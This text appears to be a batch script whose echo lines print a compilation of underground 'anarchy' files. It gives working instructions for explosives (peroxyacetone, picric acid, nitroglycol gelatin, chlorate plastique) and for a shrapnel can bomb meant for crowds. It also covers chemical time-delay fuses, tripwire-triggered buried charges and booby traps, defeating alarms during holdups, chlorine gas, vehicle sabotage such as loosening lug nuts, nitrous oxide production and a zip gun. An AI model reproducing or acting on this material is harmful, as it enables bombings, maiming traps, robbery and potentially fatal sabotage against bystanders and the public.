echo 4.Simple smoke/stink bomb - you can purchase sulfur at a drugstore under the name flowers of sulfur. Now when sulfur burns it will give off a 
echo very strong odor and plenty of smoke. Now all you need is a fuse from a firecracker, a tin can, and the sulfur. Fill the can with sulfur 
echo (pack very lightly), put aluminum foil over the top of the can, poke a small hole into the foil, insert the wick, and light it and get out of the 
echo room if you value your lungs. You can find many uses for this or at least I hope so.
echo FUN WITH ALARMS
echo A fact I forgot to mention in my previous alarm articles is that one can also use polyurethane foam in a can to silence horns and bells. You can 
echo purchase this at any hardware store as insulation. It is easy to handle and dries faster.
echo Many people that travel carry a pocket alarm with them. This alarm is a small device that is hung around the door knob, and when someone 
echo touches the knob his body capacitance sets off the alarm. These nasty nuisances can be found by walking down the halls of a hotel and 
echo touching all the door knobs very quickly. if you happen to chance upon one, attach a 3' length of wire or other metal object to the knob. This will 
echo cause the sleeping business pig inside to think someone is breaking in and call room service for help. All sorts of fun and games will ensue.
echo Some high-security installations use keypads just like touch-tone pads (a registered trade mark of bell systems) to open locks or disarm alarms. 
echo Most use three or four digits. To figure out the code, wipe the key-pad free from all fingerprints by using a rag soaked in rubbing alcohol. After 
echo the keypad has been used just apply finger print dust and all four digits will be marked. now all you have to do is figure out the order. If you 
echo want to have some fun with a keypad, try pressing the * and # at the same time. Many units use this as a panic button. This will bring the 
echo owner and the cops running and ever-one will have a good time. Never try to remove these panels from the wall, as they have built-in tamper 
echo switches.
echo On the subject of holdups, most places (including supermarkets, liquor stores, etc.) have what is known as a money clip. These little nasties 
echo are placed at the bottom of a money drawer and when the last few bills are with-drawn a switch closes and sets the alarm off. That's why 
echo when you make your withdrawal it's best to help yourself so you can check for these little nasties. If you find them, merely insert ones 
echo underneath the pile of twenties, and then pull out the twenties, leaving the one-dollar bill behind to prevent the circuit from closing.
echo SOFT DRINK CAN BOMB
echo AN ARTICLE FROM THE BOOK: 
echo THE POOR MAN'S JAMES BOND BY KURT SAXON
echo This is an anti-personnel bomb meant for milling crowds. The bottom of a soft drink can is half cut out and bent back. A giant firecracker or 
echo other explosive is put in and surrounded with nuts and bolts or rocks. The fuse is then armed with a chemical delay in a plastic drinking straw.
echo After first making sure there are no children nearby, the acid or glycerine is put into the straw and the can is set down by a tree or wall where 
echo it will not be knocked over. The delay should give you three to five minutes. It will then have a shattering effect on passersby.
echo It is hardly likely that anyone would pick up and drink from someone else's soft drink can. but if such a crude person should try to drink from 
echo your bomb he would break a nasty habit fast

echo 2.Add a few drops of glycerine.
echo 3.Wait 3-4 min.
echo 4.Get the hell out. The stuff will smoke, then burst into flames.
echo Potassium permanganate stains like iodine but worse [it's purple]. The reaction will spatter a bit so it can be messy and it doesn't matter if the

echo EXPLOSIVES AND INCENDIARIES by THE RESEARCHER
echo INTRODUCTION:
echo The trouble with text books on chemistry and explosives is the attitude with which they are written. They don't say, "Now I know you would 
echo like to blow holy hell out of something just for the fun of it so here is how to whip up something in your kitchen to do it". They tell you how 
echo Dupont does it or how the ancient Chinese did it but not how you can do it with the resources and materials available to you.
echo Even army manuals on field expedient explosives are almost useless because they are just outlines written with the understanding that an 
echo instructor is going to fill in the blanks. It is a fun game to search out the materials that can be put together to make something go "boom". You 
echo can find what you need in grocery stores, hardware stores, and farm supplies. An interesting point to remember is that it is much easier to 
echo make a big e explosion than a small one. It is very difficult for a home experimenter to make a firecracker, but a bomb capable of blowing the 
echo walls out of a building is easy.
echo HOW TO MAKE ROCKET FUEL
echo This is easy to make and fun to play with. Mix equal parts by volume Potassium or Sodium Nitrate and granulated sugar. Pour a big spoonful of 
echo this into a pile. Stick a piece of blackmatch fuse into it; light; and step back. This is also a very hot incendiary. A little imagination will suggest a 
echo lot of experiments for this.
echo ANOTHER ROCKET FUEL
echo Mix equal parts by volume of zinc dust and sulfur. Watch out if you experiment with this. It goes off in a sudden flash. It is not a powerful 
echo explosive, but is violent stuff even when not confined because of its fast burning rate.
echo As I continue from this point some of the ingredients are going to be harder to get without going through a chemical supply. I try to avoid this. I 
echo happen to know that B. Prieser Scientific (local to my area) has been instructed by the police to send them the names of anyone buying 
echo chemicals in certain combinations. For example, if a person were to buy Sulfuric acid, Nitric acid and Toluene (the makings for TNT) in one 
echo order the police would be notified. I will do the best I can to tell you how to make the things you need from commonly available materials, but I 
echo don't want to leave out something really good because you might have to scrounge for an ingredient. I am guessing you would prefer it that 
echo way.
echo HOW TO MAKE AN EXPLOSIVE FROM COMMON MATCHES
echo Pinch the head near the bottom with a pair of wire cutters to break it up; then use the edges of the cutters to scrape off the loose material. It 
echo gets easy with practice. You can do this while watching TV and collect enough for a bomb without dying of boredom.
echo Once you have a good batch of it, you can load it into a pipe instead of black powder. Be careful not to get any in the threads, and wipe off 
echo any that gets on the end of the pipe. Never try to use this stuff for rocket fuel. A science teacher was killed that way.
echo Just for fun while I'm on the subject of matches, did you know that you can strike a safety match on a window pane? Hold a paper match 
echo between your thumb and first finger. With your second finger, press the head firmly against a large window. Very quickly, rub the match down 
echo the pane about 2 feet while maintaining the pressure. The friction will generate enough heat to light the match.
echo Another fun trick is the match rocket. Tightly wrap the top half of a paper match with foil. Set it in the top of a pop bottle at a 45 ø angle. Hold a 
echo lighted match under the head until it ignites. If you got it right, the match will zip up and hit the ceiling.
echo I just remembered the match guns I used to make when I was a kid. These are made from a bicycle spoke. At one end of the spoke is a piece 
echo that screws off. Take it off and screw it on backwards. You now have a piece of stiff wire with a small hollow tube on one end. Pack the 
echo material from a couple of wooden safety matches into the tube. Force the stem of a match into the hole. It should fit very tightly. Hold a lighted 
echo match under the tube until it gets hot enough to ignite the powder. It goes off with a bang.
echo HOW TO MAKE CONCENTRATED SULFURIC ACID FROM BATTERY ACID
echo Go to an auto supply store and ask for "a small battery acid". This should only cost a few dollars. What you will get is about a gallon of dilute 
echo sulfuric acid. Put a pint of this into a heat resistant glass container. The glass pitchers used for making coffee are perfect. Do not use a metal 
echo container.
echo Use an extension cord to set up a hotplate out doors. Boil the acid until white fumes appear. As soon as you see the white fumes, turn off the 
echo hot plate and let the acid cool. Pour the now concentrated acid into a glass container. The container must have a glass stopper or plastic cap --
echo no metal. It must be air tight. Otherwise, the acid will quickly absorb moisture from the air and become diluted. Want to know how to make a time 
echo bomb that doesn't tick and has no wires or batteries? Hold on to your acid and follow me into the next installment.
echo HOW TO MAKE A CHEMICAL TIME DELAY FUSE:
echo To get an understanding of how this is going to work, mix up equal parts by volume Potassium chlorate and granulated sugar. Pour a spoonful 
echo of the mixture in a small pile and make a depression in the top with the end of a spoon. Using a medicine dropper, place one drop of 
echo concentrated sulfuric acid in the depression and step back.
echo It will snap and crackle a few times and then burst into vigorous flames. To make the fuse, cut about 2 inches off a plastic drinking straw. 
echo Tamp a small piece of cotton in one end. On top of this put about an inch of the clorate/sugar mixture.
echo Now lightly tamp in about a quarter inch of either glass wool or asbestos fibers. Secure this with the open end up and drop in 3 or 4 drops of 
echo sulfuric acid. After a few minutes the acid will soak through the fibers and ignite the mixture.
echo The time delay can be controlled by the amount of fiber used and by varying how tightly it is packed. Don't use cotton for this. The acid will 
echo react with cotton and become weakened in the process. By punching a hole in the side of the straw, a piece of blackmatch or other fuse can 
echo be inserted and used to set off the device of your choice.
echo Potassium chlorate was very popular with the radical underground. It can be used to make a wide variety of explosives and incendiaries, some 
echo of them extremely dangerous to handle. The radicals lost several people that way. But, don't worry. I am not going to try to protect you from 
echo yourself. I have decided to tell all. I will have more to say about Potassium chlorate, but for now, let's look at a couple of interesting electric 
echo fuses.
echo PEROXYACETONE
echo PEROXYACETONE IS EXTREMELY FLAMMABLE AND HAS BEEN REPORTED TO BE SHOCK SENSITIVE
echo MATERIALS:
echo · 4 mL Acetone
echo · 4 mL 30% Hydrogen Peroxide
echo · 4 drops Conc. Hydrochloric Acid
echo · 150 mm Test Tube
echo Add 4 mL acetone and 4 mL hydrogen peroxide to the test tube. Then add 4 drops concentrated hydrochloric acid. In 10-20 minutes a white 
echo solid should begin to appear. If no change is observed, warm the test tube in a water bath at 40øC. Allow the reaction to continue for two 
echo hours. Swirl the slurry and filter it. Leave out on filter paper to dry for at least two hours. To ignite, light a candle tied to a meter stick and light it 
echo (while staying at least a meter away).
echo I would like to give credit to a book by shakashari entitled "Chemical demonstrations" for a few of the precise amounts of chemicals in some 
echo experiments.
echo THE CHEMIST'S CORNER #2:
echo HOUSEHOLD CHEMICALS, BY ZAPHOD BEEBLEBROX/MPG
echo This article deals with instructions on how to do some interesting experiments with common household chemicals. Some may or may not work 
echo depending on the concentration of certain chemicals in different areas and brands. I would suggest that the person doing these experiments 
echo have some knowledge of chemistry, especially for the more dangerous experiments.
echo I am not responsible for any injury or damage caused by people using this information. It is provided for use by people knowledgeable in 
echo chemistry who are interested in such experiments and can safely handle such experiments.
echo I. A LIST OF HOUSEHOLD CHEMICALS AND THEIR COMPOSITION
echo VINEGAR: 3-5% ACETIC ACID BAKING SODA: SODIUM BICARBONATE
echo DRAIN CLEANERS: SODIUM HYDROXIDE SANI-FLUSH: 75% SODIUM BISULFATE
echo AMMONIA WATER: AMMONIUM HYDROXIDE CITRUS FRUIT: CITRIC ACID
echo TABLE SALT: SODIUM CHLORIDE SUGAR: SUCROSE
echo MILK OF MAGNESIA: MAGNESIUM HYDROXIDE TINCTURE OF IODINE: 4% IODINE
echo RUBBING ALCOHOL: 70% OR 99% (DEPENDS ON BRAND) ISOPROPYL ALCOHOL (DO NOT DRINK)
echo GENERATING CHLORINE GAS
echo This is slightly more dangerous than the other two experiments, so you should know what you're doing before you try this...
echo Ever wonder why ammonia bottles always say 'do not mix with chlorine bleach', and visa-versa? That's because if you mix ammonia water 
echo with Ajax or something like it, it will give off chlorine gas. To capture it, get a large bottle and put Ajax in the bottom. Then pour some ammonia 
echo down into the bottle. Since the chlorine is heavier than air, it will stay down in there unless you use large amounts of either Ajax or ammonia 
echo (don't).
echo CHLORINE + TURPENTINE
echo Take a small cloth or rag and soak it in turpentine. Quickly drop it into the bottle of chlorine. It should give off a lot of black smoke and probably 
echo start burning...
echo GENERATING HYDROGEN GAS
echo To generate hydrogen, all you need is an acid and a metal that will react with that acid. Try vinegar (acetic acid) with zinc, aluminum, 
echo magnesium, etc. You can collect hydrogen in something if you note that it is lighter than air.... light a small amount and it burns with a small 
echo *pop*.
echo Another way of creating hydrogen is by the electrolysis of water. This involve separating water (H2O) into hydrogen and oxygen by an 
echo electric current. To do this, you need a 6-12 volt battery (or a DC transformer), two test tubes, a large bowl, two carbon electrodes (take them 
echo out of an unworking 6-12 volt battery), and table salt. Dissolve the salt in a large bowl full of water. Submerge the two test tubes in the water 
echo and put the electrodes inside them, with the mouth of the tube aiming down. Connect the battery to some wire going down to the electrodes.
echo This will work for a while, but chlorine will be generated along with the oxygen which will corrode your copper wires leading to the carbon 
echo electrodes... (the table salt is broken up into chlorine and sodium ions, the chlorine comes off as a gas with oxygen while sodium reacts with 
echo the water to form sodium hydroxide....). therefore, if you can get your hands on some sulfuric acid, use it instead. it will not affect the 
echo reaction other than making the water conduct electricity.
echo WARNING:
echo DO NOT use a transformer that outputs AC current Not only is AC inherently more dangerous than DC, it also produces both Hydrogen and 
echo Oxygen at each electrode.
echo HYDROGEN + CHLORINE
echo Take the test tube of hydrogen and cover the mouth with your thumb. Keep it inverted, and bring it near the bottle of chlorine (not one that has 
echo reacted with turpentine). Say "good-bye test tube", and drop it into the bottle. The hydrogen and chlorine should react and possibly explode 
echo (depending on purity and amount of each gas). An interesting thing about this is they will not react if it is dark and no heat or other energy is 
echo around. When a light is turned on, enough energy is present to cause them to react...
echo PREPARATION OF OXYGEN
echo Get some hydrogen peroxide (from a drug store) and manganese dioxide (from a battery- it's a black powder). Mix the two in a bottle, and they 
echo give off oxygen. If the bottle is stoppered, pressure will build up and shoot it off.
echo Try lighting a wood splint and sticking it (when only glowing) into the bottle. The oxygen will make it burst into flame. The oxygen will allow 
echo things to burn better...
echo IODINE
echo Tincture of iodine contains mainly alcohol and a little iodine. To separate them, put the tincture of iodine in a metal lid to a bottle and heat it over a 
echo candle. Have a stand holding another metal lid directly over the tincture (about 4-6 inches above it) with ice on top of it. The alcohol should 
echo evaporate, and the iodine should sublime, but should reform iodine crystals on the cold metal lid directly above. If this works (I haven't tried), 
echo you can use the iodine along with household ammonia to form nitrogen triiodide.
echo I have found that Pool Chlorine tablets with strong household ammonia react to produce LOTS of chlorine gas and heat... also mixing the tablets 
echo with rubbing alcohol produces heat, a different (and highly flammable) gas, and possibly some sort of acid (it eats away at just about anything 
echo it touches)
echo TRIPWIRES
echo by The Mortician
echo Well first of all I recommend that you read the file on my board about landmines... If you can't then here is the concept.
echo You can use an m-80,h-100, blockbuster or any other type of explosive that will light with a fuse. Now the way this works is if you have a 9 
echo volt battery, get either a solar igniter (preferably) or some steel wool you can create a remote ignition system. What you do it set up a 
echo schematic like this.
echo  ------------------>+ battery
echo  "steel || ->- battery"
echo  "wool  || /"
echo  "     :==:--- <--fuse \"
echo  "      || /"
echo  "---- spst switch--\"
echo So when the switch is on the currnet will flow through the steel wool or igniter and heat up causing the fuse to light. Note: For use with steel 
echo wool try it first and get a really thin piece of wire and pump the current through it to make sure it will heat up to light the explosive.
echo Now the thing to do is plant your explosive wherever you want it to be, bury it and cover the wires. Now take a fishing line (about 20 lb. test) 
echo and tie one end to a secure object. Have your switch secured to something and make a loop on the other end on the line. Put the loop around 
echo the switch such that when pulled it will pull the switch and set off the explosive.
echo To ignite the explosive... The thing to do is to experiment with this and find your best method... Let me know on any good kills, or new 
echo techniques... On my board... (201)376-4462
echo BOOBY TRAP TRIP WIRES
echo BY Vlad Tepes (of Chicago C64 fame)
echo Here is a method for constructing boobytraps which I personally invented, and which I have found to work better than any other type of 
echo release booby trap.
echo There are many possible variations on this design, but the basic premise remains the same. What you'll need:
echo "· 3-4 nails each 2 inches long and soft enough to bend easily (galvanized iron works well)"
echo "· 6 feet of wire or fishing line"
echo "· 5-15 feet of strong string or rope"
echo "· 1 really sick mind."
echo Hammer two of the nails into the trunk of a tree (about one inch apart) so they form a horizontal line. They should be angled slightly upward, 
echo about 30ø.
echo Bend each nail Downward about one inch out from the trunk. Take your nefarious device (say a small rock suspended in a tree) and rig a rope 
echo or string so the line comes DOWN towards the two nails. Tie a loop in the string so the loop *just* reaches between the two nails, and pass a 
echo third nail between the two nails with the loop around this nail between the two others (see diagrams)
echo  bent nails
echo "   / || ^ slight upward tension"
echo "# /\ ||"
echo "#/ @ || @ ( @ are the two nails, head on)"
echo "# ----------()------"
echo "# trip wire"
echo "\ /"
echo Trunk third nail
echo Now tie one end of the fishing line to the head of the third nail, and the other end around another tree or to a nail (in another tree, a root or a 
echo stump etc).
echo When somebody pulls on the trip wire, the nail will be pulled out and your sick creation will be released to do it's damage (try tying it to a firing 
echo pin).
echo There are several possible variations. More than one trip wire can be attached to the same nail, or this device can be used to arm a second trip 
echo wire. Large wire staples or hook and eye loops can be used to replace the two bent nails.
echo A more interesting variation uses a straight piece of metal rod with a hole at each end, or with a short wire loop welded to each end. One end 
echo is attached to the tripwire, the other is attached to a spring.
echo  ||
echo "*/\/\/\/\/\-===()=======------ --------------------------------*"
echo  SPRING BOLT Trip wire
echo With this design the loop will be released if the tripwire is pulled or if it is broken. The spring should be under moderate tension and well oiled.
echo Improvised Explosives
echo Written by: The Lich
echo Gelatin Explosive from Anti-Freeze
echo CAUTION: THIS FORMULA ASSUMES THAT THE MAKER HAS NO QUALMS ABOUT KILLING HIS/HER SELF IN THE PROCESS.
echo This explosive is almost the same as the nitro-gelatin plastique explosive except that it is supple and pliable to -10øC to -20øC
echo Antifreeze is easier to obtain than glycerine and is usually cheaper. It needs to be freed of water before the manufacture and this can be done 
echo by treating it with calcium chloride until a specific gravity of 1.12 at 0øC or 1.11 at 20øC is obtained.
echo This can be done by adding calcium chloride to the antifreeze and checking with a hydrometer and continue to add calcium chloride until the 
echo proper reading is obtained. The antifreeze is then filtered to remove the calcium chloride from the liquid. This explosive is superior to nitrogelatin in that it is easier to collidon the IMR smokeless powder into the explosive and that the 50/50 ether ethyl alcohol can be done away with. 
echo It is superior in that the formation of the collidon is done very rapidly by the nitroethelene glycol.
echo It's detonation properties are practically the same as the nitro-gelatine. Like the nitro-gelatine it is highly flammable and if caught on fire the 
echo chances are good that the flame will progress to detonation. In this explosive as in nitro-gelatine the addition of 1% sodium carbonate is a good 
echo idea to reduce the chance of residual acid being present in the final explosive. The following is a slightly different formula than nitro-gelatine:
echo Nitro-glycol 75% Guncotton (IMR) 6% Potassium Nitrate 14% Flour 5%
echo In this process the 50/50 step is omitted. Mix the potassium nitrate with the nitro-glycol. Remember that this nitro-glycol is just as sensitive to 
echo shock as is nitroglycerin.
echo  
echo The next step is to mix in the baking flour and sodium carbonate. Mix these by kneading with gloved hands until the mixture is uniform. This 
echo kneading should be done gently and slowly. The mixture should be uniform when the IMR smokeless powder is added. Again this is kneaded to 
echo uniformity. Use this explosive as soon as possible.
echo If it must be stored, store in a cool, dry place (0-10øC). This explosive should detonate at 7600-7800 m/sec.. These two explosives are very 
echo powerful and should be sensitive to a #6 blasting cap or equivalent.
echo These explosives are dangerous and should not be made unless the manufacturer has had experience with this type compound. The foolish 
echo and ignorant may as well forget these explosives as they won't live to get to use them.
echo Don't get me wrong, these explosives have been manufactured for years with an amazing record of safety. Millions of tons of nitroglycerine 
echo have been made and used to manufacture dynamite and explosives of this nature with very few mishaps.
echo Nitroglycerin and nitroglycol will kill and their main victims are the stupid and foolhardy. Before manufacturing these explosives take a drop of 
echo nitroglycerin and soak into a small piece of filter paper and place it on an anvil.
echo Hit this drop with a hammer and don't put any more on the anvil. See what I mean This explosive compound is not to be taken lightly. If there are 
echo any doubts DON'T.
echo Improvised Explosives Plastique Explosive from Aspirin
echo This explosive is a phenol derivative. It is HIGHLY toxic and explosive compounds made from picric acid are poisonous if inhaled, ingested, or 
echo handled and absorbed through the skin. The toxicity of this explosive restricts its use due to the fact that over exposure in most cases causes 
echo liver and kidney failure and sometimes death if immediate treatment is not obtained.
echo This explosive is a cousin to TNT but is more powerful than it's cousin. It is the first explosive used militarily and was adopted in 1888 as an 
echo artillery shell filler. Originally this explosive was derived from coal tar but thanks to modern chemistry you can make this explosive easily in 
echo approximately three hours from acetylsalicylic acid (aspirin purified).
echo This procedure involves dissolving the acetylsalicylic acid in warm sulfuric acid and adding sodium or potassium nitrate which nitrates the 
echo purified aspirin and the whole mixture drowned in water and filtered to obtain the final product. This explosive is called trinitrophenol. Care 
echo should be taken to ensure that this explosive is stored in glass containers. Picric acid will form dangerous salts when allowed to contact all 
echo metals except tin and aluminum. These salts are primary explosive and are super sensitive. They also will cause the detonation of the picric 
echo acid. 
echo To make picric acid obtain some aspirin. The cheaper brands work best but buffered brands should be avoided. Powder these tablets to a fine 
echo consistency. To extract the acetylsalicylic acid from this powder place this powder in methyl alcohol and stir vigorously. Not all of the powder 
echo will dissolve. Filter this powder out of the alcohol. Again wash this powder that was filtered out of the alcohol with more alcohol but with a 
echo lesser amount than the first extraction. Again filter the remaining powder out of the alcohol. Combine the now clear alcohol and allow it to 
echo evaporate in a pyrex dish. When the alcohol has evaporated there will be a surprising amount of crystals in the bottom of the pyrex dish.
echo Take forty grams of these purified acetylsalicylic acid crystals and dissolve them in 150 mL of sulfuric acid (98%, specify gravity 1.8) and heat 
echo to dissolve all the crystals. This heating can be done in a common electric frying pan with the thermostat set on 150øF and filled with a good 
echo cooking oil.
echo When all the crystals have dissolved in the sulfuric acid take the beaker, that you've done all this dissolving in (600 mL), out of the oil bath. This 
echo next step will need to be done with a very good ventilation system (it is a good idea to do any chemistry work such as the whole procedure 
echo and any procedure on this disk with good ventilation or outside). Slowly start adding 58 g of sodium nitrate or 77 g of potassium nitrate to the 
echo acid mixture in the beaker very slowly in small portions with vigorous stirring. A red gas (nitrogen trioxide) will be formed and this should be 
echo avoided.
echo The mixture is likely to foam up and the addition should be stopped until the foaming goes down to prevent the overflow of the acid mixture in 
echo the beaker. When the sodium or potassium nitrate has been added the mixture is allowed to cool somewhat (30-40øC). The solution should then 
echo be dumped slowly into twice it's volume of crushed ice and water. The brilliant yellow crystals will form in the water. These should be filtered 
echo out and placed in 200 mL of boiling distilled water. This water is allowed to cool and then the crystals are then filtered out of the water. These 
echo crystals are a very, very pure trinitrophenol. These crystals are then placed in a pyrex dish and places in an oil bath and heated to 80øC and 
echo held there for 2 hours. This temperature is best maintained and checked with a thermometer.
echo The crystals are then powdered in small quantities to a face powder consistency. These powdered crystals are then mixed with 10% by 
echo weight wax and 5% vaseline which are heated to melting temperature and poured into the crystals. The mixing is best done by kneading 
echo together with gloved hands. This explosive should have a useful plasticity range of 0-40øC. The detonation velocity should be around 7000 
echo m/sec.. It is toxic to handle but simply made from common ingredients and is suitable for most demolition work requiring a moderately high 
echo detonation velocity. It is very suitable for shaped charges and some steel cutting charges. It is not as good an explosive as C-4 or other RDX 
echo based explosives but it is much easier to make. Again this explosive is very toxic and should be treated with great care.
echo AVOID HANDLING BARE-HANDED, BREATHING DUST AND FUMES, AVOID ANY CHANCE OF INGESTION. AFTER UTENSILS ARE USED FOR 
echo THE MANUFACTURE OF THIS EXPLOSIVE RETIRE THEM FROM THE KITCHEN AS THE CHANCE OF POISONING IS NOT WORTH THE RISK. THIS 
echo EXPLOSIVE, IF MANUFACTURED AS ABOVE, SHOULD BE SAFE IN STORAGE BUT WITH ANY HOMEMADE EXPLOSIVE STORAGE OS NOT 
echo RECOMMENDED AND EXPLOSIVES SHOULD BE MADE UP AS NEEDED.
echo Improvised Explosives Plastique Explosive from Bleach
echo This explosive is a potassium chlorate explosive. This explosive and explosives of similar composition were used in World War II as the main 
echo explosive filler in grenades, land mines, and mortar used by French, German, and other forces involved in that conflict. These explosives are 
echo relatively safe to manufacture.
echo One should strive to make sure these explosives are free of sulfur, sulfides, and picric acid. The presence of these compounds result in 
echo mixtures that are or can become highly sensitive and possibly decompose explosively while in storage. The manufacture of this explosive from 
echo bleach is given as just an expedient method. This method of manufacturing potassium chlorate is not economical due to the amount of energy 
echo used to boil the solution and cause the 'dissociation' reaction to take place. This procedure does work and yields a relatively pure and a 
echo sulfur/sulfide free product. These explosives are very cap sensitive and require only a #3 cap for instigating detonation.
echo To manufacture potassium chlorate from bleach (5¬% sodium hypochlorite solution) obtain a heat source (hot plate etc.) a battery hydrometer, 
echo a large pyrex or enameled steel container (to weigh chemicals), and some potassium chloride (sold as salt substitute). Take one gallon of 
echo bleach, place it in the container and begin heating it. While this solution heats, weigh out 63 g potassium chloride and add this to the bleach 
echo being heated. Bring this solution to a boil and boiled until when checked by a hydrometer the reading is 1.3 (if a battery hydrometer is used it 
echo should read full charge).
echo When the reading is 1.3 take the solution and let it cool in the refrigerator until it's between room temperature and 0øC. Filter out the crystals that 
echo have formed and save them. Boil the solution again until it reads 1.3 on the hydrometer and again cool the solution. Filter out the crystals that 
echo have formed and save them. Boil this solution again and cool as before.
echo Filter and save the crystals. Take these crystals that have been saved and mix them with distilled water in the following proportions: 56g per 
echo 100 mL distilled water. Heat this solution until it boils and allow it to cool. Filter the solution and save the crystals that form upon cooling. The 
echo process if purification is called fractional crystallization. These crystals should be relatively pure potassium chlorate.
echo Powder these to the consistency of face powder (400 mesh) and heat gently to drive off all moisture. Melt five parts vaseline and five parts 
echo wax. Dissolve this in white gasoline (camp stove gasoline) and pour this liquid on 90 parts potassium chlorate (the crystals from the above 
echo operation) in a plastic bowl. Knead this liquid into the potassium chlorate until immediately mixed. Allow all the gasoline to evaporate. Place this 
echo explosive in a cool, dry place. Avoid friction, sulfur, sulfide, and phosphorous compounds.
echo This explosive is best molded to the desired shape and density (1.3g/cc) and dipped in wax to water proof. These block type charges 
echo guarantee the highest detonation velocity. This explosive is really not suited to use in shaped charge applications due to its relatively low 
echo detonation velocity. It is comparable to 40% ammonia dynamite and can be considered the same for the sake of charge computation.
echo If the potassium chlorate is bought and not made it is put into the manufacture process in the powdering stages preceding the addition of the 
echo wax/vaseline mixture. This explosive is bristant and powerful. The addition of 2-3% aluminum powder increases its blast effect. Detonation 
echo velocity is 3300 m/sec.
echo Plastique Explosives From Swimming Pool Chlorinating Compound
echo This explosive is a chlorate explosive from bleach. This method of production of potassium or sodium chlorate is easier and yields a more pure 
echo product than does the plastique explosive from bleach process.
echo In this reaction the HTH (calcium hypochlorite CaC10) is mixed with water and heated with either sodium chloride (table salt, rock salt) or 
echo potassium chloride (salt substitute). The latter of these salts is the salt of choice due to the easy crystallization of the potassium chlorate.
echo This mixture will need to be boiled to ensure complete reaction of the ingredients. Obtain some HTH swimming pool chlorination compound or 
echo equivalent (usually 65% calcium hypochlorite). As with the bleach process mentioned earlier the reaction described below is also a 
echo dissociation reaction. In a large pyrex glass or enameled steel container place 1200g HTH and 220g potassium chloride or 159g sodium 
echo chloride. Add enough boiling water to dissolve the powder and boil this solution. A chalky substance (calcium chloride) will be formed. When 
echo the formation of this chalky substance is no longer formed the solution is filtered while boiling hot. If potassium chloride was used potassium 
echo chlorate will be formed.
echo This potassium chlorate will drop out or crystallize as the clear liquid left after filtering cools. These crystals are filtered out when the solution 
echo reaches room temperature. If the sodium chloride salt was used this clear filtrate (clear liquid after filtration) will need to have all water 
echo evaporated. This will leave crystals which should be saved.
echo These crystals should be heated in a slightly warm oven in a pyrex dish to drive off all traces of water (40-75øC). These crystals are ground to 
echo a very fine powder (400 mesh).
echo If the sodium chloride salt is used in the initial step the crystallization is much more time consuming. The potassium chloride is the salt to use as 
echo the resulting product will crystallize out of the solution as it cools. The powdered and completely dry chlorate crystals are kneaded together 
echo with vaseline in a plastic bowl. ALL CHLORATE BASED EXPLOSIVES ARE SENSITIVE TO FRICTION AND SHOCK AND THESE SHOULD BE 
echo AVOIDED. If sodium chloride is used in this explosive it will have a tendency to cake and has a slightly lower detonation velocity.
echo This explosive is composed of the following:
echo "· Potassium/Sodium Chlorate 90%" 
echo "· Vaseline 10%"
echo Simply pour the powder into a plastic baggy and knead in the vaseline carefully. This explosive (especially if the Sodium Chlorate variation is 
echo used) should not be exposed to water or moisture.
echo The detonation velocity can be raised to a slight extent by the addition of 2-3% aluminum substituted for 2-3% of the vaseline. This addition of 
echo this aluminum will give the explosive a bright flash if set off at night which will ruin night vision for a short while. The detonation velocity of this 
echo explosive is approximately 3200 m/sec for the potassium salt and 2900 m/sec for the sodium salt based explosive.
echo It was claimed above that this explosive degrades over time. I would assume that this occurs due to the small amount of water present in the 
echo vaseline, and that a different type of fuel would be better than the vaseline.
echo ASSORTED NASTIES:
echo Sweet-Oil
echo In this one you open there hood and pour some honey in their oil spout. If you have time you might remover the oil plug first and drain some of 
echo the oil out. I have tried this one but wasn't around to see the effects but I am sure that I did some damage.
echo Slow Air
echo OK, sneak up the victims car and poke a small hole somewhere in 2 of his/her tires. They only have 1 spare. Now if the hole is small but there 
echo then there tire will go flat some where on the road. You could slice the tire so this is blows out on the road with a razor blade. Cut a long and 
echo fairly deep (don't cut a hole all the way through) and peel a little bit of the rubber back and cut that off. Now very soon there tires will go flat or 
echo a possible blow out at a high speed if your lucky.
echo Vanishing Paint
echo Spread a little gas or paint thinner on the victims car and this will make his paint run and fade. Vodka will eat the paint off and so will a little 190. 
echo Eggs work great on paint if they sit there long enough.
echo Loose Wheel
echo Loosen the lugs on you victims tires so that they will soon fall off. This can really fuck some one up if they are cruising when the tire falls off.
echo Dual Neutral
echo This name sucks but pull the 10 bolt or what ever they have there off. (On the real wheels, in the middle of the axle) Now throw some screws, 
echo blots, nuts and assorted things in there and replace the cover. At this point you could chip some of the teeth off the gears.
echo Un-Midaser
echo Crawl under there car with a ratchet and loosen all the nuts on their exhaust so that it hangs low and will fall off soon. This method also works 
echo on transmissions but is a little harder to get all bolts off, but the harder you work the more you fuck them over.
echo LAUGHING GAS
echo Learn how to make laughing gas from ammonium nitrate. Laughing gas was one of the earliest anesthetics. After a little while of inhaling the 
echo gas the patient became so happy [ain't life great?] he couldn't keep from laughing. Finally he would drift off to a pleasant sleep.
echo Some do-it-yourselfers have died while taking laughing gas. This is because they has generated it through plastic bags while their heads were 
echo inside. They were simply suffocating but were too bombed out to realize it.
echo The trick is to have a plastic clothes bag in which you generate a lot of the gas. Then you stop generating the gas and hold a small opening of 
echo the bag under your nose, getting plenty of oxygen in the meantime. Then, Whee To make it you start with ammonium nitrate bought from a 
echo chemical supply house or which you have purified with 100% rubbing or wood alcohol.
echo First, dissolve a quantity of ammonium nitrate in some water. Then you evaporate the water over the stove, while stirring, until you have a 
echo heavy brine. When nearly all the moisture is out it should solidify instantly when a drop is put on an ice cold metal plate.
echo When ready, dump it all out on a very cold surface. After a while, break it up and store it in a bottle.
echo A spoonful is put into a flask with a one-hole stopper, with a tube leading into a big plastic bag. The flask is heated with an alcohol lamp.
echo When the temperature in the flask reaches 480 F the gas will generate. If white fumes appear the heat should be lowered as the stuff 
echo explodes at 600 F.
echo When the bag is filled, stop the action and get ready to turn on.
echo CAUTION:
echo NýO supplants oxygen in your blood, but you don't realize it. It's easy to die from NýO because you're suffocating and your breathing reflex 
echo doesn't know it. Do not put your head in a plastic bag. You will cheerfully choke to death.
echo PIPE OR "ZIP" GUNS
echo Commonly known as "zip" guns, guns made from pipe have been used for years by juvenile punks. Today's Militants make them just for the hell 
echo of it or to shoot once in an assassination or riot and throw away if there is any danger of apprehension.
echo They can be used many times but with some, a length of dowel is needed to force out the spent shell.
echo There are many variations but the illustration shows the basic design.
echo First, a wooden stock is made and a groove is cut for the barrel to rest in. The barrel is then taped securely to the stock with a good, strong 
echo tape.
echo The trigger is made from galvanized tin. A slot is punched in the trigger flap to hold a roofing nail, which is wired or soldered onto the flap. The 
echo trigger is bent and nailed to the stock on both sides.
